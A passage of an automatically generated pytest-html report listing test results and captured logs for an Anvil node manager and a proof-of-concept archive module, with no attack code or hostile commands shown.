<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8"/>
    <title id="head-title">test_report_single.html</title>
      <style type="text/css">body {
  font-family: Helvetica, Arial, sans-serif;
  font-size: 12px;
  /* do not increase min-width as some may use split screens */
  min-width: 800px;
  color: #999;
}

h1 {
  font-size: 24px;
  color: black;
}

h2 {
  font-size: 16px;
  color: black;
}

p {
  color: black;
}

a {
  color: #999;
}

table {
  border-collapse: collapse;
}

/******************************
 * SUMMARY INFORMATION
 ******************************/
#environment td {
  padding: 5px;
  border: 1px solid #e6e6e6;
  vertical-align: top;
}
#environment tr:nth-child(odd) {
  background-color: #f6f6f6;
}
#environment ul {
  margin: 0;
  padding: 0 20px;
}

/******************************
 * TEST RESULT COLORS
 ******************************/
span.passed,
.passed .col-result {
  color: green;
}

span.skipped,
span.xfailed,
span.rerun,
.skipped .col-result,
.xfailed .col-result,
.rerun .col-result {
  color: orange;
}

span.error,
span.failed,
span.xpassed,
.error .col-result,
.failed .col-result,
.xpassed .col-result {
  color: red;
}

.col-links__extra {
  margin-right: 3px;
}

/******************************
 * RESULTS TABLE
 *
 * 1. Table Layout
 * 2. Extra
 * 3. Sorting items
 *
 ******************************/
/*------------------
 * 1. Table Layout
 *------------------*/
#results-table {
  border: 1px solid #e6e6e6;
  color: #999;
  font-size: 12px;
  width: 100%;
}
#results-table th,
#results-table td {
  padding: 5px;
  border: 1px solid #e6e6e6;
  text-align: left;
}
#results-table th {
  font-weight: bold;
}

/*------------------
 * 2. Extra
 *------------------*/
.logwrapper {
  max-height: 230px;
  overflow-y: scroll;
  background-color: #e6e6e6;
}
.logwrapper.expanded {
  max-height: none;
}
.logwrapper.expanded .logexpander:after {
  content: "collapse [-]";
}
.logwrapper .logexpander {
  z-index: 1;
  position: sticky;
  top: 10px;
  width: max-content;
  border: 1px solid;
  border-radius: 3px;
  padding: 5px 7px;
  margin: 10px 0 10px calc(100% - 80px);
  cursor: pointer;
  background-color: #e6e6e6;
}
.logwrapper .logexpander:after {
  content: "expand [+]";
}
.logwrapper .logexpander:hover {
  color: #000;
  border-color: #000;
}
.logwrapper .log {
  min-height: 40px;
  position: relative;
  top: -50px;
  height: calc(100% + 50px);
  border: 1px solid #e6e6e6;
  color: black;
  display: block;
  font-family: "Courier New", Courier, monospace;
  padding: 5px;
  padding-right: 80px;
  white-space: pre-wrap;
}

div.media {
  border: 1px solid #e6e6e6;
  float: right;
  height: 240px;
  margin: 0 5px;
  overflow: hidden;
  width: 320px;
}

.media-container {
  display: grid;
  grid-template-columns: 25px auto 25px;
  align-items: center;
  flex: 1 1;
  overflow: hidden;
  height: 200px;
}

.media-container--fullscreen {
  grid-template-columns: 0px auto 0px;
}

.media-container__nav--right,
.media-container__nav--left {
  text-align: center;
  cursor: pointer;
}

.media-container__viewport {
  cursor: pointer;
  text-align: center;
  height: inherit;
}
.media-container__viewport img,
.media-container__viewport video {
  object-fit: cover;
  width: 100%;
  max-height: 100%;
}

.media__name,
.media__counter {
  display: flex;
  flex-direction: row;
  justify-content: space-around;
  flex: 0 0 25px;
  align-items: center;
}

.collapsible td:not(.col-links) {
  cursor: pointer;
}
.collapsible td:not(.col-links):hover::after {
  color: #bbb;
  font-style: italic;
  cursor: pointer;
}

.col-result {
  width: 130px;
}
.col-result:hover::after {
  content: " (hide details)";
}

.col-result.collapsed:hover::after {
  content: " (show details)";
}

#environment-header h2:hover::after {
  content: " (hide details)";
  color: #bbb;
  font-style: italic;
  cursor: pointer;
  font-size: 12px;
}

#environment-header.collapsed h2:hover::after {
  content: " (show details)";
  color: #bbb;
  font-style: italic;
  cursor: pointer;
  font-size: 12px;
}

/*------------------
 * 3. Sorting items
 *------------------*/
.sortable {
  cursor: pointer;
}
.sortable.desc:after {
  content: " ";
  position: relative;
  left: 5px;
  bottom: -12.5px;
  border: 10px solid #4caf50;
  border-bottom: 0;
  border-left-color: transparent;
  border-right-color: transparent;
}
.sortable.asc:after {
  content: " ";
  position: relative;
  left: 5px;
  bottom: 12.5px;
  border: 10px solid #4caf50;
  border-top: 0;
  border-left-color: transparent;
  border-right-color: transparent;
}

.hidden, .summary__reload__button.hidden {
  display: none;
}

.summary__data {
  flex: 0 0 550px;
}
.summary__reload {
  flex: 1 1;
  display: flex;
  justify-content: center;
}
.summary__reload__button {
  flex: 0 0 300px;
  display: flex;
  color: white;
  font-weight: bold;
  background-color: #4caf50;
  text-align: center;
  justify-content: center;
  align-items: center;
  border-radius: 3px;
  cursor: pointer;
}
.summary__reload__button:hover {
  background-color: #46a049;
}
.summary__spacer {
  flex: 0 0 550px;
}

.controls {
  display: flex;
  justify-content: space-between;
}

.filters,
.collapse {
  display: flex;
  align-items: center;
}
.filters button,
.collapse button {
  color: #999;
  border: none;
  background: none;
  cursor: pointer;
  text-decoration: underline;
}
.filters button:hover,
.collapse button:hover {
  color: #ccc;
}

.filter__label {
  margin-right: 10px;
}

      </style>
    
  </head>
  <body>
    <h1 id="title">test_report_single.html</h1>
    <p>Report generated on 18-Dec-2025 at 09:29:27 by <a href="https://pypi.python.org/pypi/pytest-html">pytest-html</a>
        v4.1.1</p>
    <div id="environment-header">
      <h2>Environment</h2>
    </div>
    <table id="environment"></table>
    <!-- TEMPLATES -->
      <template id="template_environment_row">
      <tr>
        <td></td>
        <td></td>
      </tr>
    </template>
    <template id="template_results-table__body--empty">
      <tbody class="results-table-row">
        <tr id="not-found-message">
          <td colspan="4">No results found. Check the filters.</th>
        </tr>
    </template>
    <template id="template_results-table__tbody">
      <tbody class="results-table-row">
        <tr class="collapsible">
        </tr>
        <tr class="extras-row">
          <td class="extra" colspan="4">
            <div class="extraHTML"></div>
            <div class="media">
              <div class="media-container">
                  <div class="media-container__nav--left"><</div>
                  <div class="media-container__viewport">
                    <img src="" />
                    <video controls>
                      <source src="" type="video/mp4">
                    </video>
                  </div>
                  <div class="media-container__nav--right">></div>
                </div>
                <div class="media__name"></div>
                <div class="media__counter"></div>
            </div>
            <div class="logwrapper">
              <div class="logexpander"></div>
              <div class="log"></div>
            </div>
          </td>
        </tr>
      </tbody>
    </template>
    <!-- END TEMPLATES -->
    <div class="summary">
      <div class="summary__data">
        <h2>Summary</h2>
        <div class="additional-summary prefix">
        </div>
        <p class="run-count">222 tests took 00:05:40.</p>
        <p class="filter">(Un)check the boxes to filter the results.</p>
        <div class="summary__reload">
          <div class="summary__reload__button hidden" onclick="location.reload()">
            <div>There are still tests running. <br />Reload this page to get the latest results!</div>
          </div>
        </div>
        <div class="summary__spacer"></div>
        <div class="controls">
          <div class="filters">
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="failed" />
            <span class="failed">2 Failed,</span>
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="passed" />
            <span class="passed">220 Passed,</span>
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="skipped" />
            <span class="skipped">13 Skipped,</span>
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="xfailed" disabled/>
            <span class="xfailed">0 Expected failures,</span>
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="xpassed" disabled/>
            <span class="xpassed">0 Unexpected passes,</span>
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="error" disabled/>
            <span class="error">0 Errors,</span>
            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="rerun" disabled/>
            <span class="rerun">0 Reruns</span>
          </div>
          <div class="collapse">
            <button id="show_all_details">Show all details</button>&nbsp;/&nbsp;<button id="hide_all_details">Hide all details</button>
          </div>
        </div>
      </div>
      <div class="additional-summary summary">
      </div>
      <div class="additional-summary postfix">
      </div>
    </div>
    <table id="results-table">
      <thead id="results-table-head">
        <tr>
          <th class="sortable" data-column-type="result">Result</th>
          <th class="sortable" data-column-type="testId">Test</th>
          <th class="sortable" data-column-type="duration">Duration</th>
          <th>Links</th>
        </tr>
      </thead>
    </table>
  </body>
  <footer>
    <div id="data-container" data-jsonblob="{&#34;environment&#34;: {&#34;Python&#34;: &#34;3.13.11&#34;, &#34;Platform&#34;: &#34;macOS-26.2-arm64-arm-64bit-Mach-O&#34;, &#34;Packages&#34;: {&#34;pytest&#34;: &#34;8.4.2&#34;, &#34;pluggy&#34;: &#34;1.6.0&#34;}, &#34;Plugins&#34;: {&#34;mock&#34;: &#34;3.15.1&#34;, &#34;asyncio&#34;: &#34;1.2.0&#34;, &#34;jaxtyping&#34;: &#34;0.3.3&#34;, &#34;anyio&#34;: &#34;4.9.0&#34;, &#34;html&#34;: &#34;4.1.1&#34;, &#34;xdist&#34;: &#34;3.8.0&#34;, &#34;timeout&#34;: &#34;2.4.0&#34;, &#34;metadata&#34;: &#34;3.1.1&#34;, &#34;hypothesis&#34;: &#34;6.138.15&#34;, &#34;benchmark&#34;: &#34;5.1.0&#34;, &#34;cov&#34;: &#34;7.0.0&#34;}}, &#34;tests&#34;: {&#34;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_failure&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_failure&#34;, &#34;duration&#34;: &#34;00:00:04&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_failure&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:04&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;---------------------------- Captured stdout setup -----------------------------\n\ud83d\ude80 Starting required services: rag_api, frontend, poc_api\nStarting RAG API service (FastAPI)...\nStarting PoC API service (Flask)...\n\u2705 All required services are running and healthy\n&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_invalid_response&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_invalid_response&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_invalid_response&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_success&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_check_anvil_running_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_get_anvil_status_not_running&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_get_anvil_status_not_running&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_get_anvil_status_not_running&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_get_anvil_status_running&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_get_anvil_status_running&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_get_anvil_status_running&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_initialization&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_restart_anvil&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_restart_anvil&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_restart_anvil&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_already_running&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_already_running&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_already_running&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_port_conflict&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_port_conflict&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_port_conflict&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.anvil_manager:anvil_manager.py:163 \u274c Could not free port 18545 for Anvil\n\n&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_startup_failure&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_startup_failure&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_startup_failure&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.anvil_manager:anvil_manager.py:204 \u274c Anvil startup failed - health check timeout\n\n&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_success&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_start_anvil_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_stop_anvil_no_process&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_stop_anvil_no_process&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_stop_anvil_no_process&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_stop_anvil_with_tracked_process&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_stop_anvil_with_tracked_process&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_stop_anvil_with_tracked_process&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_wait_for_anvil_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_wait_for_anvil_success&#34;, &#34;duration&#34;: &#34;00:00:01&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_wait_for_anvil_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:01&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestAnvilManager::test_wait_for_anvil_timeout&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestAnvilManager::test_wait_for_anvil_timeout&#34;, &#34;duration&#34;: &#34;00:00:02&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestAnvilManager::test_wait_for_anvil_timeout&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:02&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.anvil_manager:anvil_manager.py:148 \u274c Anvil failed to start within 2s timeout (2 attempts)\n\n&#34;}], &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_check_anvil_running_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_check_anvil_running_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestConvenienceFunctions::test_check_anvil_running_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_get_anvil_status_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_get_anvil_status_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestConvenienceFunctions::test_get_anvil_status_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_restart_anvil_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_restart_anvil_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestConvenienceFunctions::test_restart_anvil_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_start_anvil_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_start_anvil_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestConvenienceFunctions::test_start_anvil_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_stop_anvil_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_stop_anvil_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestConvenienceFunctions::test_stop_anvil_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_wait_for_anvil_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_anvil_manager.py::TestConvenienceFunctions::test_wait_for_anvil_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_anvil_manager.py::TestConvenienceFunctions::test_wait_for_anvil_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_edge_cases&#34;, &#34;duration&#34;: &#34;6 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_archive_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;6 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_archive_edge_cases - PASSED\nDuration: 0.01s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,156 - TestPoCArchive.test_archive_edge_cases - INFO - Testing PoC archive edge cases\n2025-12-18 09:23:56,156 - TestPoCArchive.test_archive_edge_cases - INFO - \u2705 Archive edge cases handled correctly\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_archive_edge_cases:test_framework.py:390 Testing PoC archive edge cases\nINFO     TestPoCArchive.test_archive_edge_cases:test_framework.py:390 \u2705 Archive edge cases handled correctly\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_error_handling&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_error_handling&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_archive_error_handling&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\nWarning: Failed to load archive: Expecting value: line 1 column 1 (char 0)\n\n======================================================================\nTEST RESULT: test_archive_error_handling - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,157 - TestPoCArchive.test_archive_error_handling - INFO - Testing PoC archive error handling\n2025-12-18 09:23:56,158 - 